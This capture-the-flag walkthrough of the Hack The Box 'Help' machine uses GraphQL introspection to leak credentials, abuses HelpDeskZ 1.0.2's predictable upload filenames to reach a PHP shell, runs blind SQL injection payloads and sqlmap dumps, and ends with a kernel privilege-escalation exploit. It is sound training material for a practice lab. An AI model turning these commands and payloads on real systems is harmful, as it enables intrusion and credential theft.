---
icon: ubuntu
---

# Help - Easy

<figure><img src="../../.gitbook/assets/image (2979).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/help"><strong>Help</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.121 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 21:11 EST
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   30.42 ms 10.10.16.1
2   59.31 ms help.htb (10.10.10.121)
```

### <mark style="color:$primary;">HTTP Port 3000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2980).png" alt=""><figcaption></figcaption></figure>

This port Hosts an API, we see a message about geting credentials with the correct query

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

The first thing I like to check when I see an endpoint like this is for graphql

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

$This is graphql nice!

### <mark style="color:$primary;">Enumerating GraphQL</mark>

Will use curl for enumerating GraphQL

Get the fields from the schema

{% code overflow="wrap" %}
```shellscript
curl -s help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }"}' | jq -c .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Next let's get the types of User, String ...

{% code overflow="wrap" %}
```shellscript
curl -s help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }"}' | jq -c .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

I’ll get the fields associated with the User type

{% code overflow="wrap" %}
```shellscript
curl -s help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }"}' | jq .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

try to get the values

{% code overflow="wrap" %}
```shellscript
curl -s help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ User { username password } }"}' | jq .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

it did not like capital User, let's fix that

{% code overflow="wrap" %}
```shellscript
curl -s help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }"}' | jq .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

we got a username and an md5 hash. Crackstation takes care of it

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

I think we got what we needed here, let's check out port 80

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

We get a redirect to help.htb so add that to your hosts file

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We get redirected to a default apache page, I'll do some directory busting

#### <mark style="color:yellow;">Directory Busting</mark>

```shellscript
feroxbuster -u http://help.htb
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

feroxbuster discovers an interesting endpoint support.

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

I am able to login using the creds we discovered earlier on Graphql

```
helpme@helpme.com:godhelpmeplz
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

[**HelpDeskz**](https://github.com/helpdesk-z/helpdeskz-dev) is an open source helpdesk software. Checking out [**github**](https://github.com/helpdesk-z/helpdeskz-dev) there is a readme.html file in the root directory

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

A quick searchsploit reveals a Arbitrary File Upload Vulnerability for this version.

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Arbitrary File Upload HelpDeskz v1.0.2</mark>

Looking at source code of Helpdeskz  on Github repo

{% embed url="https://github.com/ViktorNova/HelpDeskZ/blob/master/controllers/submit_ticket_controller.php" %}

In the `controllers/submit_ticket_controller.php` file, we identified the portion of the code that handles file uploads. Three issues stand out:

1. Uploaded files are stored under `/support/<Upload_dir>/tickets`.
2. The application performs **no validation of the file type** before uploading; an error is shown only after the upload is already complete, making the check ineffective.
3. Each uploaded file is renamed using the pattern `md5(original_filename + epoch_timestamp).php`, where the timestamp appears to come from PHP’s `time()` function.

With the naming scheme now understood, it became clear why our earlier test upload couldn’t be found the file had been renamed using the MD5 pattern based on its original name and the server’s current epoch time. To correctly determine this filename, we needed the server’s timestamp, which might not match our own system’s time zone. To get that value as accurately as possible, we uploaded a PHP file while capturing the request details through the browser’s developer tools.&#x20;

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

now that we have the timestamp let's open up php and get the md5 hash

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Picture does not correspond because this took a couple of tries so I named my shell differently. Now curl this link and you should have a shell on your designated listener

```
help.htb/support/uploads/tickets/ca6c67bddbbfe8f9b06eaa7d15cce9ca.php
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Another way to get a shell is via a blind SQLI in the application

### <mark style="color:$primary;">Blind SQLI</mark>

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

The above http parameter looks interesting!

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

If we go to My Tickets and check the ticket we created earlier. You will see even more http parameter fields&#x20;

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Blind SQLI</mark>

{% code overflow="wrap" %}
```shellscript
http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
```
{% endcode %}

Clicking on the attachement it will give us a download link with even more http parameters!

There is a SQLI vulnerability in the last parameter. To trigger it simply add `and 1=2-- -` at the end

{% code overflow="wrap" %}
```shellscript
http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6%20and%201=2--%20-
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

if you change it to `and 1=1-- -`  instead the download will proceed as normal

Open up burpsuite intercept the request and save it to a file

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

As much as I love doint SQLI manually, for this machine I had to give in and use sqlmap been stuck on it for to long. To get it working I ran the following command

```shellscript
sqlmap -r ticket_attachment.req --level 5 --risk 3 -p param[] --batch
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Now that we have that injection going, just run `--dump` to dump all the tables

{% code overflow="wrap" %}
```shellscript
sqlmap -r ticket_attachment.req --level 5 --risk 3 -p param[] --batch --dump
```
{% endcode %}

Now skim through the output and you'll come across a table called staff that has some credentials

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

A nicer output of the table below

```
Database: support                                                                                                                      
Table: staff
[1 entry]
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| id | email              | login      | avatar | admin   | status   | fullname      | password                                            | timezone | username | signature                      | department         | last_login | newticket_notification |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| 1  | support@mysite.com | 1547216217 | NULL   | 1       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | <blank>  | admin    | Best regards,\r\nAdministrator | a:1:{i:0;s:1:"1";} | 1543429746 | 0                      |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
```

sqlmap was also able to crack the password hash came out to Welcome1

You are able to use the help user and the Welcome1 as password to ssh into the system

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Googling the kernel will give you a couple of priv esc exploits!&#x20;

{% embed url="https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh" %}

download this to your system and transfer it to the target machine and run it.&#x20;

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

You should have a shell as the root user!
